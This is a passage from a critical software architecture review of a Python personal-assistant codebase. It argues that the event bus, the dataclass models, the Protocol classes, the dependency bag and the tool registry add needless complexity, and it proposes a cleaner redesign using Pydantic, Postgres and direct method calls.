**The bus has no error handling.** If `_on_fact_created` fails (say, the index DB is locked), the exception propagates to `FactMemory.remember()`, which is called from a tool execution context, which means the user sees an error for an indexing failure that has nothing to do with their request.

Redis pub/sub would give you: error isolation, persistence, cross-process communication, pattern matching. Python signals would give you: synchronous in-process events with sender filtering. Even `asyncio.Queue` would give you: backpressure, bounded buffers, and decoupled producer/consumer.

But none of these are needed because the EventBus solves a problem that doesn't exist. Direct method calls would be simpler and more debuggable.

---

## 5. Why Frozen Dataclasses Instead of Pydantic?

The core domain models use frozen dataclasses:

```python
@dataclass(frozen=True)
class Fact:
    id: int
    text: str
    fact_type: FactType
    embedding: Embedding | None
    # ... 8 more fields
```

Meanwhile, the same codebase uses Pydantic for API models:

```python
class ChatRequest(BaseModel):
    message: str
    skip_approvals: bool = False
```

And for LLM response parsing:

```python
class ConsolidationSchema(BaseModel):
    action: Literal["update", "create", "skip"]
    observation_id: int | None = None
```

Why the split? Frozen dataclasses give you:
- Immutability
- Hashability
- That's it.

Pydantic would additionally give you:
- Validation (is `fact_type` actually a valid FactType? dataclasses don't check)
- Serialization (`model_dump()` instead of manual `asdict()`)
- JSON schema generation
- `model_validate()` instead of `_row_to_fact()` manual mapping
- `model_validate_json()` for the JSON blob fields

The manual `_row_to_fact()` methods (facts.py:249-264) are doing the work that Pydantic's `model_validate(dict(row))` does automatically. Every new field requires updating BOTH the dataclass AND the _row_to method. This is a maintenance burden that exists solely because the codebase chose dataclasses for aesthetic reasons.

The counter-argument is "dataclasses are simpler." But the codebase already depends on Pydantic (for Config, for API models, for LLM schemas). Adding Pydantic to domain models adds zero new dependencies.

---

## 6. The Protocol Pattern: Type-Hint Theater

`base.py` defines 6 Protocol classes: `IndexableSource`, `NotesSource`, `EmailSource`, `CalendarSource`, `BrowserSource`, `WebSearchSource`.

**Question: Are these Protocols ever used polymorphically?**

Let me trace the usage of `NotesSource`:

1. Defined in `base.py:60` as a Protocol
2. Referenced in `specs.py:64`: `source = _find_source(deps.sources, NotesSource)`
3. `_find_source` does: `isinstance(source, source_type)` -- but `NotesSource` is NOT `@runtime_checkable`

For `isinstance()` to work with a Protocol, it must be decorated with `@runtime_checkable`. Without it, `isinstance(source, NotesSource)` would raise `TypeError`.

Looking more carefully at the actual implementations:
- `ObsidianSource` -- does NOT inherit from `NotesSource`
- `MultiGmailSource` -- inherits from `Source` (the ABC), not from `EmailSource` (the Protocol)... wait, actually it does: `class MultiGmailSource(EmailSource)`

So some sources inherit, some don't. For the ones that inherit (like `MultiGmailSource(EmailSource)`), `isinstance` works via normal class inheritance, not Protocol structural typing. For the ones that DON'T inherit (like `ObsidianSource`), the Protocol's structural typing is NOT being used at runtime.

This means the Protocols serve as:
1. IDE documentation (hover shows the expected interface)
2. Type checker hints (if mypy is run in strict mode, which it probably isn't)
3. Base classes for SOME implementations (defeating the purpose of structural typing)

They do NOT serve as runtime contracts. They do NOT enable polymorphic dispatch. They do NOT provide validation that implementations are complete. They're documentation written in Python syntax instead of comments.

---

## 7. ToolDeps: Not DI, Not a Dict, Not Useful

```python
@dataclass(frozen=True)
class ToolDeps:
    sources: dict[str, Any]
    memory: FactMemory | None = None
    search_index: Any | None = None
    schedule_store: ScheduleStore | None = None
    default_email: str | None = None
    working_dir: str | None = None
```

This is a frozen bag of optional fields. Every field except `sources` defaults to `None`. `sources` is `dict[str, Any]` -- complete type erasure.

How is this better than a `dict`? A dict at least admits it's untyped. `ToolDeps` pretends to be typed but has `Any` in two of its six fields. The "frozen" constraint buys nothing because ToolDeps is created once in `ToolExecutor.__init__` and passed to `spec.create(deps)` -- it's never stored, compared, or hashed.

Real dependency injection would look like:

```python
class NotesToolsSpec:
    def create(self, source: NotesSource, search_index: SearchIndex | None = None) -> list[Tool]:
        return [ListNotesTool(source), SearchNotesTool(source, search_index=search_index)]
```

Each spec declares EXACTLY what it needs. No god parameter. No type erasure. No `_find_source` linear scan.

---

## 8. The Registry Pattern: A Dict With Extra Steps

`ToolRegistry`:
```python
class ToolRegistry:
    def __init__(self):
        self._tools: dict[str, Tool] = {}
        self._schemas: dict[str, dict] = {}

    def register(self, tool: Tool) -> None:
        self._tools[tool.name] = tool
        self._schemas[tool.name] = tool.to_dict()

    def get(self, name: str) -> Tool | None:
        return self._tools.get(name)
```

This is `dict[str, Tool]` with pre-computed schemas. The class adds `get_schemas(mutates=...)` filtering, which could be a function. The `__contains__` and `__len__` methods delegate directly to the dict. This class exists to wrap a dict in a class, adding zero behavior that a `dict[str, Tool]` plus a `filter()` call wouldn't provide.

`SOURCES` in `registry.py`:
```python
SOURCES: dict[str, SourceSpec] = {
    spec.name: spec
    for spec in [ObsidianSpec(), GmailSpec(), ...]
}
```

This is already a dict. At least it's honest about it. But the ToolRegistry hides the dict behind methods that add no value.

---

## 9. Is This Architecture or Accidental Complexity?

The four reviews collectively paint a picture of a system that was built incrementally and then rationalized as architecture. The evidence:

### 9.1 Inconsistent Patterns

- Memory is a special case everywhere (not in SOURCES, manually wired, different reinit path)
- Some sources inherit from Protocols, some don't
- Some models are Pydantic, some are dataclasses
- Config uses @lru_cache but is mutated in place
- SQL uses explicit queries but no explicit transactions

### 9.2 Duplicate State

- `runtime.gmail` duplicates `source_mgr.sources["email"]`
- `runtime.browser` duplicates `source_mgr.sources["browser"]`
- `runtime.tools` duplicates `executor.get_tools()`
- `runtime.schedule_store` is also accessible via `session_store.conn`

### 9.3 Layer Violations

- Scheduler imports and calls Runtime methods (circular dependency via TYPE_CHECKING)
- DashboardCollector accesses private fields of RunRegistry, Scheduler, and FactMemory
- SourceManager publishes events but Runtime subscribes to itself
- Config is mutated by both get_config() and PATCH /config endpoint

### 9.4 Missing Fundamentals

- No transactions (remember() does 3 separate commits)
- No error isolation in EventBus
- No timeout on approval queue
- No graceful shutdown drain
- No authentication
- No rate limiting
- No health checks that actually check health
- No schema migrations

### Verdict

This is a well-written prototype that works for its current user. But calling it "architecture" is generous. Architecture implies deliberate structural decisions that constrain future changes in productive ways. This codebase has structural decisions that were made incrementally and now constrain future changes in unproductive ways.

The four architect reviews identified most of these issues individually but consistently under-weighted their collective impact. Any ONE of these issues is minor. Together, they describe a system that will resist every non-trivial change -- adding a new source, adding multi-user support, improving concurrency, testing in isolation, deploying to production.

"It works for a personal tool" is not a defense. It's the minimum bar. The question is: does the architecture HELP or HINDER the next 10 changes? Based on what I see, it hinders.

---

## 10. What Would a Clean Version Look Like?

If I were starting from scratch:

1. **Postgres + pgvector** -- real async, real transactions, real vector search, migrations via Alembic
2. **Pydantic for all models** -- validation, serialization, schema generation, consistent pattern
3. **dependency-injector for DI** -- each component declares what it needs, container wires it
4. **Direct method calls instead of EventBus** -- the indirection buys nothing when there are 5 handlers on the same object
5. **Typed source registry** -- `dict[str, Source]` with a proper `Source` ABC that ALL sources implement, including `close()` and `health_check()`
6. **Scheduler receives interfaces, not Runtime** -- `Scheduler(executor: ToolExecutor, memory: FactMemory, config: Config, ...)` instead of `Scheduler(runtime: Runtime)`
7. **SQLAlchemy for data access** -- type-safe queries, automatic migrations, relationship loading
8. **Auth from day one** -- even a simple bearer token
9. **Proper transactions** -- `remember()` should be a single atomic operation
10. **Pydantic-based tool schemas** -- replace hand-rolled `make_schema()` with Pydantic model schemas (which is what litellm wants anyway)

Is this "over-engineering"? No. It's using tools that already exist instead of hand-rolling worse versions of them.
